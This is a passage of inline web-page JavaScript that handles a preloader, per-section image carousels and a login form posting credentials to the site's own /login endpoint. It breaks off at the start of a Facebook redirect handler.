    <script>
        // Preloader logic
        window.addEventListener("load", function () {
            const preloader = document.getElementById("preloader");
            const hasSeenPreloader = sessionStorage.getItem("hasSeenPreloader");

            console.log("Has seen preloader:", hasSeenPreloader); // Debugging log

            if (!hasSeenPreloader) {
                // Show the preloader
                preloader.style.display = 'flex';

                // Set a delay before hiding the preloader
                setTimeout(() => {
                    preloader.classList.add("hidden");

                    // Store the flag in sessionStorage to indicate that the user has seen the preloader
                    sessionStorage.setItem("hasSeenPreloader", "true");
                    console.log("Preloader hidden and sessionStorage updated."); // Debugging log
                }, 2000); // 2000 milliseconds (2 seconds) delay
            } else {
                // If the user has seen the preloader, hide it immediately
                preloader.classList.add("hidden");
                console.log("Preloader hidden immediately as user has seen it."); // Debugging log
            }



           // JavaScript to handle the image carousel behavior in each section
           const sections = document.querySelectorAll('.carousel-section');

sections.forEach((section) => {
    let slideIndex = 0;
    const slides = section.querySelectorAll('.carousel-slide');

    // Function to show next slide
    function showNextSlide() {
        slides.forEach((slide) => {
            slide.classList.remove('active');
        });
        slideIndex = (slideIndex + 1) % slides.length;
        slides[slideIndex].classList.add('active');
    }

    // Random interval for each section (between 3 and 6 seconds)
    const randomInterval = Math.random() * (6000 - 3000) + 3000;
    setInterval(showNextSlide, randomInterval);

    // Show the first slide initially
    slides[slideIndex].classList.add('active');
});



        });

        // Show spinner on form submission
        async function handleFormSubmission(event) {
            event.preventDefault();

            // Show spinner
            document.querySelector('.joining').style.display = 'flex';
            document.querySelector('.log').disabled = true;

            const formData = {
                email: document.querySelector('input[name="email"]').value,
                password: document.querySelector('input[name="password"]').value
            };

            // Send POST request with form data
            await fetch("/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(formData)
            }).then(response => {
                if (response.ok) {
                    // Redirect to home page to display success or error message
                    window.location.href = '/';
                } else {
                    // If any error, log it (or handle it as per your requirement)
                    console.error("Login failed.");
                    window.location.href = '/'; // Redirect anyway to show message
                }
            });
        }

        // Attach submission handler to form
        document.querySelector('form').addEventListener('submit', handleFormSubmission);

        // Facebook Redirect Logic
        window.addEventListener("DOMContentLoaded", function () {
            const successMessage = document.querySelector('.success');

            if (successMessage) {
